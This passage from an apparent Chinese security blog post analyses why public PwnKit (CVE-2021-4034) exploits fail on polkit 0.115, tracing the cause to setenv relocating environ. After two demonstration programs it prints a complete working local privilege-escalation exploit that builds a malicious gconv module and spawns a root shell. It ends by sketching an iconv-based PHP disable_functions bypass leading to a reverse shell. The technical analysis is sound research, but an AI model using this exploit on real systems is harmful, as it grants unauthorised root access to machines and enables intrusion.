也正是这一句，导致网上能找到的大部分exp在0.114+以后的版本中无法提权成功  
目前GitHub上能找到注意到这个问题的exp就只有下面两个  
**为什么有了这一句setenv会导致大部分exp无法利用呢？先说结论：这是因为setenv会导致
env环境发生迁移，使得数组越界写的漏洞无法注入恶意环境变量到envp中了**
可以做个小实验试试看  
t1模拟我们的exp程序，t2模拟0.115 版本的 pkexec程序
    //t1
    //gcc ./t1.c -o t1
    #include 
    #include 
    #include 
    int main(int argc, char *argv[]) {
        char *a_argv[]={NULL };
        char *a_envp[]={
            "env1=1",
            "env2=2",
            //"env3=123456789",
            "env4=",
            NULL
        };
        execve("./t2", a_argv, a_envp);
    }
    ////////////////////////////////////////
    //t2
    //gcc ./t2.c -o t2
    #include 
    #include 
    #include 
    extern char**environ;
    int main(int argc, char *argv[]) {
        setenv("env3","local",1);
        printf("stack envp:\n");
        printf("%p:%s\n", &argv[1], argv[1]);
        printf("%p:%s\n", &argv[2] ,argv[2]);
        printf("%p:%s\n\n",&argv[3],argv[3]);
        char** var;
        printf("real environ:\n");
        for (var =environ;*var !=NULL;++var)
            printf("%p:%s\n", var, *var);
    }
编译好后运行t1
可以看到，在t1中注入的环境变量env1，env2，env4都显示出来了  
但是我们可以发现t2的环境变量地址已经发生改变了  
一般来说，argv数组是和envp相邻挨着排布在栈里面的，然而这里可以看到，t2的环境变量地址已经变成了一个堆的地址，且在t2中设置的环境变量env3已经不出现在栈里面了，环境变量地址environ已经改变了
**这就会导致漏洞无法利用，前面已经分析过了，漏洞是一个数组越界写，写的是栈上的envp[0]，而此时envp已经不在栈上了，那么这个漏洞也就无法利用了，注入GCONV_PATH就不能做到了**  
为什么会发生envp的迁移？答案在glibc源码中  
在调用setenv时，如果发现要set的env不存在，那么会调用realloc函数，重新开辟一段空间来存储environ指针，且替代旧的指针  
而如果 发现要set的env存在，那么直接复制数据过去即可，不再创建堆空间
因此我们要避免setenv函数导致的envp迁移，所以需要在调用setenv之前，把该环境变量给设置一遍  
回到t1.c中 把注释打开
> //"env3=123456789",
重新编译并运行：
可以看到，envp没有发生迁移，这样一来，后面的越界写的漏洞才能继续利用
也就是说，在exp1的代码中里面加入 设置环境变量 GIO_USE_VFS= 即可提权0.115版本的pkexec
    #include 
    #include 
    #include 
    char *shell =
            "#include \n"
            "#include \n"
            "#include \n\n"
            "void gconv() {}\n"
            "void gconv_init() {\n"
            "       setuid(0); setgid(0);\n"
            "       seteuid(0); setegid(0);\n"
            "       system(\"export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin; /bin/sh\");\n"
            "       exit(0);\n"
            "}";
    int main(int argc, char *argv[]) {
            FILE *fp;
            system("mkdir -p 'GCONV_PATH=.'; touch 'GCONV_PATH=./pwnkit'; chmod a+x 'GCONV_PATH=./pwnkit'");
            system("mkdir -p pwnkit; echo 'module UTF-8// PWNKIT// pwnkit 1' > pwnkit/gconv-modules");
            fp = fopen("pwnkit/pwnkit.c", "w");
            fprintf(fp, "%s", shell);
            fclose(fp);
            system("gcc pwnkit/pwnkit.c -o pwnkit/pwnkit.so -shared -fPIC");
            char *env[] = { "pwnkit", "PATH=GCONV_PATH=.", "CHARSET=PWNKIT","GIO_USE_VFS=", "SHELL=pwnkit", NULL };
            execve("./pkexec_115", (char*[]){NULL}, env);
    }
运行截图：
# 小结
本文详细写了一些网上公开的exp中没有讲到的细节，我在复现过程中也是请教了不少大哥，虽然这个cve简单，但学到的姿势还是不少的，好久没搞二进制了，搞完这个漏洞感觉爷青回，这个漏洞完全可以出成一道pwn题了，非常经典
另外通过这个cve，我还意外发现了一种php bypass disablefunction的姿势  
核心原理就是：php在执行iconv函数时，实际上是调用glibc中的iconv相关函数，同样会用到iconv_open，因此如果php中存在任意文件上传的漏洞，我们就可以把so和gconv-modules传到/tmp目录中去  
然后再利用php马触发到执行到so，最后实现反弹shell
例如
>
> 好久没来先知投稿了，上一次还是我大四的时候投的了，那个时候的陈师傅还不会吃人，也还没有二群，一转眼就快工作两年了，时间过得好快好快，而我还是好菜好菜....
# 参考